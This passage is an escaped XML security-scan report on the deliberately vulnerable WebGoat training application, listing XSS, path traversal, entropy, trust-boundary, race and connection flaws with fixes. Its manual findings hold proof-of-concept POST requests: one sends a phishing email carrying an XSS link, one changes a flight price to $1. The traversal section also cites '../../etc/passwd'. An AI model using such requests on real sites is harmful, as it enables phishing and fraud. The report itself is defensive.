        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"80\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"50\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"129\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable thisPage.
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameternames,
        and javax.servlet.servletrequest.getparameter. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"143\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"89\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n</staticflaws>\n</cwe>\n</category>\n<category
        categoryid=\"12\" categoryname=\"Cryptographic Issues\" pcirelated=\"false\">\n<desc>\n<para
        text=\"Applications commonly use cryptography to implement authentication
        mechanisms and to ensure the confidentiality and integrity of sensitive data,
        both in transit and at rest.  The proper and accurate implementation of cryptography
        is extremely critical to its efficacy.  Configuration or coding mistakes as
        well as incorrect assumptions may negate a large degree of the protection
        it affords, leaving the crypto implementation vulnerable to attack.\"/>\n<para
        text=\"Common cryptographic mistakes include, but are not limited to, selecting
        weak keys or weak cipher modes, unintentionally exposing sensitive cryptographic
        data, using predictable entropy sources, and mismanaging or hard-coding keys.
        \ \"/>\n<para text=\"Developers often make the dangerous assumption that they
        can improve security by designing their own cryptographic algorithm; however,
        one of the basic tenets of cryptography is that any cipher whose effectiveness
        is reliant on the secrecy of the algorithm is fundamentally flawed.  \"/>\n</desc>\n<recommendations>\n<para
        text=\"Select the appropriate type of cryptography for the intended purpose.
        \ Avoid proprietary encryption algorithms as they typically rely on &quot;security
        through obscurity&quot; rather than sound mathematics.  Select key sizes appropriate
        for the data being protected; for high assurance applications, 256-bit symmetric
        keys and 2048-bit asymmetric keys are sufficient.  Follow best practices for
        key storage, and ensure that plaintext data and key material are not inadvertently
        exposed.\"/>\n</recommendations>\n<cwe cweid=\"331\" cwename=\"Insufficient
        Entropy\" pcirelated=\"false\">\n<description>\n<text text=\"Standard random
        number generators do not provide a sufficient amount of entropy when used
        for security purposes. Attackers can brute force the output of pseudorandom
        number generators such as rand().\"/>\n</description>\n<staticflaws>\n<flaw
        severity=\"3\" categoryname=\"Insufficient Entropy\" count=\"1\" issueid=\"173\"
        module=\"WebGoat-5.0-with-jsp.war\" type=\"java.lang.Math.random\" description=\"Standard
        random number generators do not provide a sufficient amount of entropy when
        used for security purposes. Attackers can brute force the output of pseudorandom
        number generators such as rand().\r\n\r\nIf this random number is used where
        security is a concern, such as generating a session key or session identifier,
        use a trusted cryptographic random number generator instead. These can be
        found on the Windows platform in the CryptoAPI or in an open source library
        such as OpenSSL. In Java, use the SecureRandom object to ensure sufficient
        entropy.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/331.html)\r\n\r\n\"
        note=\"\" cweid=\"331\" remediationeffort=\"2\" exploitLevel=\"-1\" categoryid=\"12\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"WeakSessionID.java\" line=\"77\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.WeakSessionID\" functionprototype=\"void
        &lt;clinit&gt;(void)\" functionrelativelocation=\"75\"/>\n</staticflaws>\n</cwe>\n</category>\n<category
        categoryid=\"1\" categoryname=\"Directory Traversal\" pcirelated=\"false\">\n<desc>\n<para
        text=\"Allowing user input to control paths used in filesystem operations
        may enable an attacker to access or modify otherwise protected system resources
        that would normally be inaccessible to end users.  In some cases, the user-provided
        input may be passed directly to the filesystem operation, or it may be concatenated
        to one or more fixed strings to construct a fully-qualified path.\"/>\n<para
        text=\"When an application improperly cleanses special character sequences
        in user-supplied filenames, a path traversal (or directory traversal) vulnerability
        may occur.  For example, an attacker could specify a filename such as &quot;../../etc/passwd&quot;,
        which resolves to a file outside of the intended directory that the attacker
        would not normally be authorized to view.\"/>\n</desc>\n<recommendations>\n<para
        text=\"Assume all user-supplied input is malicious.  Validate all user-supplied
        input to ensure that it conforms to the expected format, using centralized
        data validation routines when possible.  When using black lists, be sure that
        the sanitizing routine performs a sufficient number of iterations to remove
        all instances of disallowed characters and ensure that the end result is not
        dangerous.\"/>\n</recommendations>\n<cwe cweid=\"73\" cwename=\"External Control
        of File Name or Path\" pcirelated=\"false\">\n<description>\n<text text=\"This
        call contains a path manipulation flaw.  The argument to the function is a
        filename constructed using user-supplied input.  If an attacker is allowed
        to specify all or part of the filename, it may be possible to gain unauthorized
        access to files on the server, including those outside the webroot, that would
        be normally be inaccessible to end users.  The level of exposure depends on
        the effectiveness of input validation routines, if any.\"/>\n</description>\n<staticflaws>\n<flaw
        severity=\"3\" categoryname=\"External Control of File Name or Path\" count=\"1\"
        issueid=\"238\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.io.File.!operator_javanewinit\"
        description=\"This call to java.io.File.!operator_javanewinit() contains a
        path manipulation flaw. The argument to the function is a filename constructed
        using user-supplied input. If an attacker is allowed to specify all or part
        of the filename, it may be possible to gain unauthorized access to files on
        the server, including those outside the webroot, that would be normally be
        inaccessible to end users. The level of exposure depends on the effectiveness
        of input validation routines, if any. The second argument to !operator_javanewinit()
        contains tainted data from the variable helpFile. The tainted data originated
        from an earlier call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nValidate
        all user-supplied input to ensure that it conforms to the expected format,
        using centralized data validation routines when possible. When using black
        lists, be sure that the sanitizing routine performs a sufficient number of
        iterations to remove all instances of disallowed characters.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/73.html) \r\nWASC (http://webappsec.pbworks.com/Path-Traversal)\r\n\r\n\"
        note=\"\" cweid=\"73\" remediationeffort=\"2\" exploitLevel=\"2\" categoryid=\"1\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"CommandInjection.java\" line=\"171\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.CommandInjection\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"69\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"External Control of File Name or Path\" count=\"1\"
        issueid=\"252\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.io.File.!operator_javanewinit\"
        description=\"This call to java.io.File.!operator_javanewinit() contains a
        path manipulation flaw. The argument to the function is a filename constructed
        using user-supplied input. If an attacker is allowed to specify all or part
        of the filename, it may be possible to gain unauthorized access to files on
        the server, including those outside the webroot, that would be normally be
        inaccessible to end users. The level of exposure depends on the effectiveness
        of input validation routines, if any. The second argument to !operator_javanewinit()
        contains tainted data from the variable helpFile. The tainted data originated
        from an earlier call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nValidate
        all user-supplied input to ensure that it conforms to the expected format,
        using centralized data validation routines when possible. When using black
        lists, be sure that the sanitizing routine performs a sufficient number of
        iterations to remove all instances of disallowed characters.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/73.html) \r\nWASC (http://webappsec.pbworks.com/Path-Traversal)\r\n\r\n\"
        note=\"\" cweid=\"73\" remediationeffort=\"2\" exploitLevel=\"2\" categoryid=\"1\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"CommandInjection.java\" line=\"180\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.CommandInjection\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"80\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"External Control of File Name or Path\" count=\"1\"
        issueid=\"9\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.io.FileInputStream.!operator_javanewinit\"
        description=\"This call to java.io.FileInputStream.!operator_javanewinit()
        contains a path manipulation flaw. The argument to the function is a filename
        constructed using user-supplied input. If an attacker is allowed to specify
        all or part of the filename, it may be possible to gain unauthorized access
        to files on the server, including those outside the webroot, that would be
        normally be inaccessible to end users. The level of exposure depends on the
        effectiveness of input validation routines, if any. The first argument to
        !operator_javanewinit() contains tainted data from the variable fileName.
        The tainted data originated from earlier calls to javax.servlet.http.HttpServletRequest.getHeader,
        javax.servlet.ServletRequest.getParameterValues, javax.servlet.http.HttpServletRequest.getCookies,
        and javax.servlet.ServletRequest.getParameterNames.\r\n\r\nValidate all user-supplied
        input to ensure that it conforms to the expected format, using centralized
        data validation routines when possible. When using black lists, be sure that
        the sanitizing routine performs a sufficient number of iterations to remove
        all instances of disallowed characters.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/73.html)
        \r\nWASC (http://webappsec.pbworks.com/Path-Traversal)\r\n\r\n\" note=\"\"
        cweid=\"73\" remediationeffort=\"2\" exploitLevel=\"2\" categoryid=\"1\" pcirelated=\"false\"
        date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"LessonTracker.java\" line=\"238\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.LessonTracker\" functionprototype=\"LessonTracker
        load(WebSession, java.lang.String, Screen)\" functionrelativelocation=\"20\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"External Control of File Name or Path\" count=\"1\"
        issueid=\"39\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.io.File.!operator_javanewinit\"
        description=\"This call to java.io.File.!operator_javanewinit() contains a
        path manipulation flaw. The argument to the function is a filename constructed
        using user-supplied input. If an attacker is allowed to specify all or part
        of the filename, it may be possible to gain unauthorized access to files on
        the server, including those outside the webroot, that would be normally be
        inaccessible to end users. The level of exposure depends on the effectiveness
        of input validation routines, if any. The first argument to !operator_javanewinit()
        contains tainted data from the variable file. The tainted data originated
        from an earlier call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nValidate
        all user-supplied input to ensure that it conforms to the expected format,
        using centralized data validation routines when possible. When using black
        lists, be sure that the sanitizing routine performs a sufficient number of
        iterations to remove all instances of disallowed characters.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/73.html) \r\nWASC (http://webappsec.pbworks.com/Path-Traversal)\r\n\r\n\"
        note=\"\" cweid=\"73\" remediationeffort=\"2\" exploitLevel=\"2\" categoryid=\"1\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"PathBasedAccessControl.java\" line=\"136\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.PathBasedAccessControl\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"39\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n</staticflaws>\n</cwe>\n</category>\n<category
        categoryid=\"22\" categoryname=\"Encapsulation\" pcirelated=\"false\">\n<desc>\n<para
        text=\"Encapsulation is about defining strong security boundaries governing
        data and processes. Within an application, it might mean differentiation between
        validated and unvalidated data, between public and private members, or between
        one user's data and another's.  \"/>\n<para text=\"In object-oriented programming,
        the term encapsulation is used to describe the grouping together of data and
        functionality within an object and the ability to provide users with a well-defined
        interface in a way which hides their internal workings.  Though there is some
        overlap with the above definition, the two definitions should not be confused
        as being interchangeable.\"/>\n</desc>\n<recommendations>\n<para text=\"The
        wide variance of encapsulation issues makes it impractical to generalize how
        these issues should be addressed, beyond stating that encapsulation boundaries
        should be well-defined and adhered to.  Refer to individual categories for
        specific recommendations. \"/>\n</recommendations>\n<cwe cweid=\"501\" cwename=\"Trust
        Boundary Violation\" pcirelated=\"false\">\n<description>\n<text text=\"A
        trust boundary violation occurs when a program blurs the line between what
        is trusted and what is untrusted.  This application mixes trusted and untrusted
        data in the same data structure.  By doing so, it becomes easier for programmers
        to mistakenly trust unvalidated data.  Without well-established and maintained
        trust boundaries, programmers will inevitably lose track of which pieces of
        data have been validated and which have not. This confusion will eventually
        allow some data to be used without first being validated.  A common manifestation
        of this flaw is in J2EE application, when a Session object is used to store
        untrusted data from the HTTP request.\"/>\n</description>\n<staticflaws>\n<flaw
        severity=\"3\" categoryname=\"Trust Boundary Violation\" count=\"1\" issueid=\"246\"
        module=\"WebGoat-5.0-with-jsp.war\" type=\"javax.servlet.http.HttpSession.setAttribute\"
        description=\"This call to javax.servlet.http.HttpSession.setAttribute() mixes
        trusted and untrusted data in the same data structure, thereby encouraging
        programmers to mistakenly trust unvalidated data. The second argument to setAttribute()
        contains tainted data from the variable value. The tainted data originated
        from an earlier call to javax.servlet.ServletRequest.getParameterValues.\r\n\r\nAvoid
        storing untrusted data alongside trusted data in the same data structure.
        Establish and maintain trust boundaries for data storage.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/501.html)\r\n\r\n\" note=\"\"
        cweid=\"501\" remediationeffort=\"2\" exploitLevel=\"0\" categoryid=\"22\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"DefaultLessonAction.java\" line=\"89\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.DefaultLessonAction\" functionprototype=\"void
        setSessionAttribute(session.WebSession, java.lang.String, java.lang.Object)\"
        functionrelativelocation=\"64\"/>\n</staticflaws>\n</cwe>\n</category>\n<category
        categoryid=\"25\" categoryname=\"Insufficient Input Validation\" pcirelated=\"false\">\n<desc>\n<para
        text=\"Weaknesses in this category are related to an absent or incorrect protection
        mechanism that fails to properly validate input that can affect the control
        flow or data flow of a program.\"/>\n</desc>\n<recommendations>\n<para text=\"Validate
        input from untrusted sources before it is used. The untrusted data sources
        may include HTTP requests, file systems, databases, and any external systems
        that provide data to the application. In the case of HTTP requests, validate
        all parts of the request, including headers, form fields, cookies, and URL
        components that are used to transfer information from the browser to the server
        side application.\"/>\n<para text=\"Duplicate any client-side checks on the
        server side. This should be simple to implement in terms of time and difficulty,
        and will greatly reduce the likelihood of insecure parameter values being
        used in the application.\"/>\n</recommendations>\n<cwe cweid=\"472\" cwename=\"External
        Control of Assumed-Immutable Web Parameter\" pcirelated=\"false\">\n<description>\n<text
        text=\"The web application does not sufficiently verify inputs that are assumed
        to be immutable but are actually externally controllable, such as hidden form
        fields.\"/>\n</description>\n<manualflaws>\n<flaw severity=\"3\" categoryname=\"External
        Control of Assumed-Immutable Web Parameter\" count=\"1\" issueid=\"274\" module=\"manual_analysis\"
        type=\"\" description=\"The application send emails on behalf of the user.
        The contents of the message and the delivery address are controllable by the
        client. \" note=\"\" cweid=\"472\" remediationeffort=\"2\" exploitLevel=\"2\"
        categoryid=\"25\" pcirelated=\"false\" date_first_occurrence=\"2012-02-29
        16:13:33 UTC\" remediation_status=\"New\" cia_impact=\"ppn\" grace_period_expires=\"\"
        affects_policy_compliance=\"false\" location=\"http://targethost/WebGoat/attack?Screen=1706623184&amp;menu=1700\"
        cvss=\"5\" capecid=\"6\" exploitdifficulty=\"2\" inputvector=\"to, subject,
        msg\">\n<exploit_desc>An attacker could utilize this email to send SPAM messages
        resulting in the SMPT relay to become untrusted among email service providers.
        A sophisticated attacker could utilize this to conduct spear phising attacks.
        The phising email could include links to pages within the application that
        are vulnerable to open redirect or cross-site scripting, making the attack
        extremely difficult for a user to detect.</exploit_desc>\n<severity_desc>Due
        to other vulnerabilities within the application that would allow for a sophisticated
        spear phising attack, the issue becomes more severe. A security aware user
        could easily be tricked by the spear phising links since they would start
        with the correct domain name.</severity_desc>\n<remediation_desc>Only send
        emails to predetermined delivery addresses that are associated with the application
        or with the current user. Do not allow the client to set the subject or other
        smtp headers. Escape all client input with the same mechanisms used to escape
        tainted data before display within an HTML context.</remediation_desc>\n<appendix>\n<description>undefined</description>\n<screenshot
        format=\"PNG\">\n<data></data>\n</screenshot>\n<code>The
        following POST request demonstrates the issue. It send an email message to
        Phising.Victim@owasp.org. The message body contains a link that when clicked
        will utilize a cross-site scripting attack to make the phising attack appear
        more legitimate.\n\nPOST /WebGoat/attack?Screen=1706623184&amp;menu=1700 HTTP/1.1\nHost:
        targethost\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0.1) Gecko/20100101
        Firefox/9.0.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:
        en-us,en;q=0.5\nAccept-Encoding: gzip, deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nProxy-Connection:
        keep-alive\nReferer: http://targethost/WebGoat/attack?Screen=1706623184&amp;menu=1700\nCookie:
        JSESSIONID=13984BA559044E0A4610D4AC31B06B27\nContent-Type: application/x-www-form-urlencoded\nContent-Length:
        339\n\ngId=GMail+id&amp;gPass=password&amp;subject=Password Reset Necessary!&amp;to=Phising.Victim%40owasp.org&amp;msg=Due
        to a security flaw in our software all users must immediatly reset their password.
        Please click the following link to reset your password: http://targethost/WebGoat/somevulnerablepage?xssparam=XssPayLoadThatWillStealPassword&amp;SUBMIT=Send%21</code>\n</appendix>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"External Control of Assumed-Immutable Web Parameter\"
        count=\"1\" issueid=\"273\" module=\"manual_analysis\" type=\"\" description=\"The
        application trusts values used in business logic that originate from the client.
        The price of a flight is passed to the client through a JSON request. The
        price value is subsequently sent back to the application when the client orders
        a flight. There is no verification that the price value has not be modified.\"
        note=\"\" cweid=\"472\" remediationeffort=\"2\" exploitLevel=\"2\" categoryid=\"25\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        location=\"http://targethost/WebGoat/attack?Screen=655909089&amp;menu=400\"
        cvss=\"6\" capecid=\"6\" exploitdifficulty=\"1\" inputvector=\"price2Submit\">\n<exploit_desc>A
        malicious client attempting to book a flight and save money can intercept
        the booking request and modify the price.</exploit_desc>\n<severity_desc>The
        issue becomes severe since the malicious client will cause a loss in revenue.
        A sophisticated attacker may resell the stolen flights at a discounted rate,
        causing an even larger loss in revenue.</severity_desc>\n<remediation_desc>Only
        send values from the client to the application that are necessary and cannot
        be obtained from an internal data source. The price of the flight can be associated
        with the the client's session, then obtained from the internal and trusted
        data source as necessary. Treat all values from the client as untrusted.</remediation_desc>\n<appendix>\n<description>undefined</description>\n<code>The
        following POST request allows a ticket from BOS to SEA to be purchased for
        1 dollar.\nNotice that the price2Submit parameter is set to %241 or $1\n\nPOST
        /WebGoat/attack?Screen=655909089&amp;menu=400 HTTP/1.1\nHost: targethost\nUser-Agent:
        Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\nAccept:
        text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:
        en-us,en;q=0.5\nAccept-Encoding: gzip, deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nProxy-Connection:
        keep-alive\nReferer: http://targethost/WebGoat/attack?Screen=655909089&amp;menu=400\nCookie:
        JSESSIONID=13984BA559044E0A4610D4AC31B06B27\nContent-Type: application/x-www-form-urlencoded\nContent-Length:
        69\n\ntravelFrom=BOS&amp;travelTo=SEA&amp;radio0=on&amp;SUBMIT=Submit&amp;price2Submit=%241</code>\n</appendix>\n</flaw>\n</manualflaws>\n</cwe>\n</category>\n<category
        categoryid=\"13\" categoryname=\"Race Conditions\" pcirelated=\"false\">\n<desc>\n<para
        text=\"Race conditions are the most well-known timing flaw and are related
        to improper handling of a resource that can be accessed by multiple processes.
        \ Race conditions exploit the small window of time between when a security
        control is applied and when the service is used.  Vulnerabilities occur when
        there is a discrepancy between the programmer's assumption of how a program
        executes and what happens in reality. \"/>\n<para text=\"Attackers often exploit
        race conditions to gain unauthorized access to system resources.  A common
        scenario is a time-of-check time-of-use race condition, which takes advantage
        of a timing gap between the time the authorization check is performed and
        the time the resource is actually used. \"/>\n</desc>\n<recommendations>\n<para
        text=\"Review the code carefully for any pair of operations that might fail
        if arbitrary code is executed between them. Often, developers assume that
        a series of actions represent an atomic operation when in fact they do not.
        These non-atomic conditions commonly involve the filesystem and/or temporary
        files.\"/>\n<para text=\"Pay close attention to asynchronous actions in processes
        and make copious use of sanity checks in systems that may be subject to synchronization
        errors.\"/>\n</recommendations>\n<cwe cweid=\"366\" cwename=\"Race Condition
        within a Thread\" pcirelated=\"false\">\n<description>\n<text text=\"If two
        threads of execution use a resource simultaneously, there exists the possibility
        that resources may be used while invalid, in turn making the state of execution
        undefined.\"/>\n</description>\n<staticflaws>\n<flaw severity=\"3\" categoryname=\"Race
        Condition within a Thread\" count=\"1\" issueid=\"47\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"span.set\" description=\"There are total of 12 instances. A shared
        variable 'mySession' is used here without a locking mechanism such as a synchronized
        block. If two threads of execution reference a shared variable simultaneously,
        the variable may be invalid or in an unexpected state.\r\n\r\nUse locking
        functionality around code that alters or reads persistent data in a multi-threaded
        environment.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/366.html)\r\n\r\n\"
        note=\"\" cweid=\"366\" remediationeffort=\"2\" exploitLevel=\"-1\" categoryid=\"13\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"npp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"HammerHead.java\" line=\"135\" sourcefilepath=\"org/owasp/webgoat/\"
        scope=\"org.owasp.webgoat.HammerHead\" functionprototype=\"void doPost(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"3\"/>\n</staticflaws>\n</cwe>\n</category>\n</severity>\n<severity
        level=\"2\">\n<category categoryid=\"7\" categoryname=\"API Abuse\" pcirelated=\"false\">\n<desc>\n<para
        text=\"An API is a contract between a caller and a callee. Incorrect usage
        of certain API functions can result in exploitable security vulnerabilities.\"/>\n<para
        text=\"The most common forms of API abuse are caused by the caller failing
        to honor its end of this contract.  For example, if a program fails to call
        chdir() after calling chroot(), it violates the contract that specifies how
        to change the active root directory in a secure fashion.  Providing too few
        arguments to a varargs function such as printf() also violates the API contract
        and will cause the missing parameters to be populated with unexpected data
        from the stack.\"/>\n<para text=\"Another common mishap is when the caller
        makes false assumptions about the callee's behavior.  One example of this
        is when a caller expects a DNS-related function to return trustworthy information
        that can be used for authentication purposes.  This is a bad assumption because
        DNS responses can be easily spoofed.\"/>\n</desc>\n<recommendations>\n<para
        text=\"When calling API functions, be sure to fully understand and adhere
        to the specifications to avoid introducing security vulnerabilities.  Do not
        make assumptions about trustworthiness of the data returned from API calls
        or use the data in a context that was unintended by that API.\"/>\n</recommendations>\n<cwe
        cweid=\"245\" cwename=\"J2EE Bad Practices: Direct Management of Connections\"
        pcirelated=\"false\">\n<description>\n<text text=\"The J2EE application directly
        manages connections rather than using the container's resource management
        facilities to obtain connections as specified in the J2EE standard.  Every
        major web application container provides pooled database connection management
        as part of its resource management framework. Duplicating this functionality
        in an application is difficult and error prone, which is part of the reason
        it is forbidden under the J2EE standard.\"/>\n</description>\n<staticflaws>\n<flaw
        severity=\"2\" categoryname=\"J2EE Bad Practices: Direct Management of Connections\"
        count=\"1\" issueid=\"202\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.sql.DriverManager.getConnection\"
        description=\"This call to getConnection() fails to use the J2EE container's
        resource management facilities as required by the J2EE standard.\r\n\r\nRequest
        the connection from the container rather than attempting to access it directly.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/245.html)\r\n\r\n\" note=\"\"
        cweid=\"245\" remediationeffort=\"2\" exploitLevel=\"0\" categoryid=\"7\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"nnp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"CreateDB.java\" line=\"69\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.CreateDB\" functionprototype=\"void main(java.lang.String
        \ [])\" functionrelativelocation=\"16\"/>\n<flaw severity=\"2\" categoryname=\"J2EE
        Bad Practices: Direct Management of Connections\" count=\"1\" issueid=\"114\"
        module=\"WebGoat-5.0-with-jsp.war\" type=\"java.sql.DriverManager.getConnection\"
        description=\"This call to getConnection() fails to use the J2EE container's
        resource management facilities as required by the J2EE standard.\r\n\r\nRequest
        the connection from the container rather than attempting to access it directly.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/245.html)\r\n\r\n\" note=\"\"
        cweid=\"245\" remediationeffort=\"2\" exploitLevel=\"0\" categoryid=\"7\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"nnp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"DatabaseUtilities.java\" line=\"68\" sourcefilepath=\"org/owasp/webgoat/session/\"
